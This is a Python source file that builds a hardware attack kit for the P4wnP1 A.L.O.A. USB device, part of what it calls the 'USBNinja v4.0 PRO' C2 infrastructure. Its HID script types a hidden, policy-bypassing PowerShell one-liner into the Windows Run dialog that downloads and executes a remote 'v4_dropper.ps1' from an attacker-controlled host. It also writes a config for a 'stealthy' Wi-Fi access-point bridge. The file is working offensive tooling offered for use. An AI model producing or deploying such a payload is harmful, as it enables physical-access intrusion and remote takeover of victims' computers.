import json
from pathlib import Path

class P4wnP1Bridge:
    """
    Generates P4wnP1 A.L.O.A. compatible HID and Network payloads
    to bridge the hardware with the v4.0 PRO C2 infrastructure.
    """
    
    @staticmethod
    def generate_hid_script(lhost, lport, mport):
        """
        Generates a JavaScript HID script for P4wnP1 A.L.O.A.
        that automates the deployment of the v4.0 PRO autonomous kit.
        """
        script = f"""
// USBNinja v4.0 PRO - P4wnP1 HID Payload
// Automates the "Live Watch" deployment

layout('us'); // Set keyboard layout
typingSpeed(0, 0); // Fastest typing

// 1. Open Run dialog (Windows) or Terminal (Linux/Mac)
press("GUI r");
delay(500);

// 2. Execute the autonomous v4.0 PRO dropper
// This uses a one-liner to download and run the engagement kit
type("powershell -NoP -NonI -W Hidden -Exec Bypass \\"IEX (New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/v4_dropper.ps1')\\"\\n");

// 3. Notify P4wnP1 Web UI
log("USBNinja v4.0 PRO Payload Injected. Monitoring on {lhost}:{mport}");
"""
        return script

    @staticmethod
    def generate_p4wnp1_config(ssid="USBNinja_Bridge", password="password123"):
        """
        Generates the P4wnP1 A.L.O.A. config for a stealthy Wi-Fi bridge.
        """
        config = {
            "wifi": {
                "enabled": True,
                "ssid": ssid,
                "password": password,
                "mode": "ap",
                "channel": 6
            },
            "usb": {
                "enabled": True,
                "gadgets": ["hid", "network"]
            }
        }
        return config

    def save_p4wnp1_kit(self, output_dir: Path, lhost, lport, mport):
        p4wn_dir = output_dir / "P4wnP1_Hardware_Kit"
        p4wn_dir.mkdir(exist_ok=True, parents=True)
        
        # Save HID Script
        (p4wn_dir / "usbninja_v4_hid.js").write_text(self.generate_hid_script(lhost, lport, mport))
        
        # Save Bridge Config
        (p4wn_dir / "p4wnp1_config.json").write_text(json.dumps(self.generate_p4wnp1_config(), indent=4))
        
        return p4wn_dir
